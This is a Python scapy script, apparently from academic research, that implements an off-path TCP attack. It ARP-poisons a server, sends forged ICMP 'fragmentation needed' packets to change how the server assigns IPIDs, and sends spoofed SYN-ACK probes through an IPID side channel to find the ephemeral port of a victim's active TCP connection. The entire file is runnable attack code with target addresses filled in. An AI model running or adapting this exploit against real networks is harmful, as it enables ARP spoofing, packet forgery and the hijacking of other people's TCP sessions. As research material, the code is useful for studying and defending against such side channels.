# coding=utf-8

import struct
import threading
import time
from scapy.all import *
from scapy.layers.inet import *
from scapy.layers.l2 import *

"""
    @CreateDate:    2020/2/9
    @Group:         Off-Path TCP Exploit Via ICMP
                    and IPID Side-Channel
    @Project:       Work2
    @Filename:      connection_find.py (renamed)
    @Brief:         This program is used for finding a active tcp connection. For
                    certain known service port, this program expect to guess a temporal
                    port number after find the right collision ip address.
                    The work flow of this program can be found on slide (page 20 & 21).
                    It is worth to mention here, this program utilize a send-then-sniff
                    style (sr() style was used before).
                    This program send packet in 'burst' style to reduce the unnecessary
                    round trip time. And this program check ports 'block-by-block'.
                    A time counter based multi-threading service model is used.
    @Modify:        2020/2/21    Kevin.F:    modified arp poison as a periodical routine
                    2020/2/21    Kevin.F:    modified send fragment needed ICMP as a 
                                             periodical routine.
                    2020/2/21    Kevin.F:    utilize Precluding Filter multiplex architecture
                                             (from connection_plus4.py)
                    2020/3/9     Kevin.F:    Remove Precluding Filter multiplex architecture
                    2020/3/9     Kevin.F:    Add scapy sniffer fliter equation for ICMP
                    2020/3/10    Kevin.F:    Add time-counter based architecture
                    2020/3/18    Kevin.F:    Add script variable my_if_name
"""

forge_ip = '10.10.16.92'                    # hash collision IP (get form collision_find.py)
victim_ip = '10.10.100.1'                   # victim ip address
server_ip = '10.10.100.2'                   # server ip address
server_port = 3000                          # known server port (e.g. ssh:22 BGP:179 Rocket.Chat 3000)

server_mac_addr = '00:0c:29:20:f4:8c'       # mac address of server used for ARP poison
my_if_name = 'ens33'                        # bind one ethernet interface
my_mac_addr = get_if_hwaddr(my_if_name)     # mac address of attacker
z_payload = b''                             # full-zero byte string used for padding

N_THREAD = 5                                # number of checking thread
BLOCK = 150                                 # port block size
sleep_time = 0.5                            # for maximum challenge-ACK rate

semaphore_fin = threading.Semaphore(1)      # for stop correctly
semaphore_ipid = threading.Semaphore(1)     # semaphore for IPID (prevent oblivious collision)
semaphore = threading.Semaphore(1)          # write-lock semaphore
task_list = []                              # collecting suspected port numbers
start_port = 32767                          # scanning start at?
current_port = start_port                   # current pointer
end_port = 61000                            # scanning end at?
stop = False                                # find active connectin?
result = -1                                 # target port number

MX = 3                                      # number of IPID-based connection check
reverse = False                             # from higher port numbers down to lowers

"""
    @Date:      2020/3/9
    @Author:    Kevin.F
    @Init:      port    ->  suspected port number
                count   ->  number of check hit records
                l_time  ->  last checking hit time
    @Brief:     This is a basic structure to record checked ports.
                We will the ports again after time counter expire to tackle challege-
                ACK rate limit. (tcp_invalid_ratelimit, 500ms)
                When the hit counter reach variable MX, we commit it as an active
                connection.
"""
class Task:
    def __init__(self, port, count=0, l_time=0.0):
        self.port = port
        self.count = count
        self.l_time = l_time

    def __cmp__(self, other):
        return self.count > other.count

    def __eq__(self, other):
        return self.port == other.port

    def __hash__(self):
        return hash(self.port)

"""
    Finally, an active TCP connection can be marked as a quadruple:
    <victim_ip, server_ip, result, server_port> 
"""

"""
    @Date:      2020/2/6
    @Author:    Kevin.F
    @Param:     
    @Return:    None, but trigger another arp poison thread. 
    @Brief:     We utilized arp-poison attack to fool the server that we own such a
                IP address which can cause IPID counter hash collision. 
"""
def arp_inject():
    forged_ip = forge_ip
    # here we send a UDP packet to allure server to execute ip/mac convert
    pkt = sniff(filter="arp " + "and dst " + forged_ip + " and ether src " + server_mac_addr,
                iface=my_if_name, timeout=1, count=1, started_callback=
                lambda: send(IP(src=forged_ip, dst=server_ip) / UDP(dport=80),
                             iface=my_if_name, verbose=False))

    if len(pkt) == 1 and pkt[0][1].fields['psrc'] == server_ip and pkt[0][1].fields['pdst'] == forged_ip:
        send(ARP(pdst=server_ip, hwdst=server_mac_addr, psrc=forged_ip, hwsrc=my_mac_addr, op=2),
             iface=my_if_name, verbose=False)

    time.sleep(0.5)

    if not stop:
        ts = threading.Thread(target=arp_inject)
        ts.start()


"""
    @Date:      2020/2/21
    @Author:    Kevin.F
    @Param:     
    @Return:    None, but trigger another same thread. 
    @Brief:     We send forged ICMP fragment needed ICMP error message. to trick
                the server into setting DF as 0 and Down-Dimension IPID assignment
                method from per-connection to hash based method.
"""
def tcp_fragment():
    send(IP(src=forge_ip, dst=server_ip) /
         ICMP(type=3, code=4, nexthopmtu=68) /
         IP(flags=2, src=server_ip, dst=victim_ip) /
         ICMP(type=0, code=0) /
         z_payload,
         iface=my_if_name, verbose=False)

    time.sleep(0.5)

    if not stop:
        tr = threading.Thread(target=tcp_fragment)
        tr.start()


"""
    @Date:      2020/2/21
    @Author:    Kevin.F
    @Param:     list_p    ->  A block of ports
    @Return:    ipid_next ->  selected port numbers which are suspected as active
                              port, these port(s) need(s) to be checked again (dump into
                              pool_1 or move form pool_1 to 2) or admit it is the
                              active port number.
    @Brief:     This function acts as the Precluding Filter. It checks ports in list and
                preclude some of them and return the rest.
                Note that this function perform an probabilistic checking. This means for
                any ports in list when we found IPID changing is 1 then we can preclude it.
                While the changing is 2 (or more) we cannot confirm such a port number is 
                active port. Because the changing could cause by delay (> 1ms).
"""
def check_new_list(list_p):
    C = len(list_p)
    icmp_seq = random.randint(0, (1 << 16) - 1)

    # construct sending list
    send_list = [IP(src=forge_ip, dst=server_ip) / ICMP(id=icmp_seq)]
    for p in list_p:
        send_list.append(IP(src=victim_ip, dst=server_ip) / TCP(sport=p, dport=server_port, flags='SA'))
        send_list.append(IP(src=forge_ip, dst=server_ip) / ICMP(id=icmp_seq))

    while True:
        semaphore_ipid.acquire()
        pkts = sniff(filter="icmp and icmp[4:2]=" + str(icmp_seq) + " and dst " + forge_ip,
                     iface=my_if_name, count=1 + C, timeout=2, started_callback=
                     lambda: send(send_list, iface=my_if_name, verbose=False))
        semaphore_ipid.release()
        if len(pkts) != 1 + C:
            time.sleep(sleep_time)
        else:
            break

    ipids = []
    for pk in pkts:
        ipids.append(pk[1].fields['id'])

    ipid_next = []
    for i in range(1, C + 1):
        if ipids[i] - ipids[i - 1] >= 2:
            ipid_next.append(list_p[i - 1])

    return ipid_next


"""
    @Date:      2020/3/9
    @Author:    Kevin.F
    @Param:     None
    @Return:    None
    @Brief:     For each routine, this function first check tasks in list (suspected prots in list). This 
                function will fetch a port number form task_list only if its time counter is expired. 
                And then add some ports haven't been checked before.
                Every ports pass the check (via check_new_list), will be marked as suspected and
                will be added to task_list.
                If one port has passed <MX> check, we will admit it as a active port.
"""
def check_task_new_block():
    global result
    global stop
    global current_port
    global task_list

    port_set = set()
    port_list = []
    semaphore.acquire()
    task_set = set(task_list)
    ls = list(task_set)
    time_now = time.time()
    for ti in ls:
        if time_now - ti.l_time > sleep_time:
            task_set.remove(ti)
            port_list.append(ti.port)
            port_set.add(ti)
            if len(port_list) == BLOCK:
                break

    task_list = list(task_set)

    if len(port_list) == BLOCK:
        list_p = port_list
        semaphore.release()
    else:
        if not reverse:
            s_p = current_port
            current_port += BLOCK - len(port_list)
            current_port = min(end_port, current_port)
            e_p = current_port
            if current_port == end_port:
                stop = True
            semaphore.release()
        else:
            e_p = current_port
            current_port -= BLOCK - len(port_list)
            current_port = max(start_port, current_port)
            s_p = current_port
            if current_port == start_port:
                stop = True
            semaphore.release()

        list_p = list(range(s_p, e_p))
        list_p.extend(port_list)
        print('checking: ' + str(s_p) + ' - ' + str(e_p))

    ipid_next = check_new_list(list_p)
    time_now = time.time()

    if len(ipid_next) != 0:
        add_task_new = []
        add_task = set()
        add_set = []

        for p in ipid_next:
            if Task(p) in port_set:
                add_task.add(p)
            else:
                add_task_new.append(p)

        for p in add_task_new:
                add_set.append(Task(p, 1, time_now))

        for ta in port_set:
            if ta.port in add_task:
                if ta.count == MX - 1:
                    semaphore.acquire()
                    result = ta.port
                    stop = True
                    semaphore.release()
                    print('--Found Port: ' + str(result))
                    return

                add_set.append(Task(ta.port, ta.count + 1, time_now))

        semaphore.acquire()
        task_list.extend(add_set)
        semaphore.release()


"""
    @Date:      2020/3/10
    @Author:    Kevin.F
    @Param:     None
    @Return:    None
    @Brief:     This function acts as a basic thread template. This must handle
                checking stop correctly. And init new checking task.
"""
def check_template():
    global stop
    global result

    if stop:
        if result == -1:
            semaphore_fin.acquire()
            while len(task_list) != 0:
                check_task_new_block()
                time.sleep(sleep_time)
            semaphore_fin.release()
        else:
            print('Found Port: ' + str(result))

        return
    else:
        check_task_new_block()

    # start new thread
    t = threading.Thread(target=check_template)
    t.start()


if __name__ == '__main__':
    # construct padding payload
    for i in range(0, 520):
        z_payload += struct.pack('B', 0)

    # for reserve checking
    current_port = start_port if not reverse else end_port

    # start the ARP poison
    ts = threading.Thread(target=arp_inject)
    ts.start()

    # start sending forged ICMP needed
    tr = threading.Thread(target=tcp_fragment)
    tr.start()

    # create sub-threads
    for i in range(0, N_THREAD):
        t = threading.Thread(target=check_template, name=('T' + str(i)))
        t.start()
        time.sleep(0.05)
        print('Num_' + str(i) + ' thread started.')
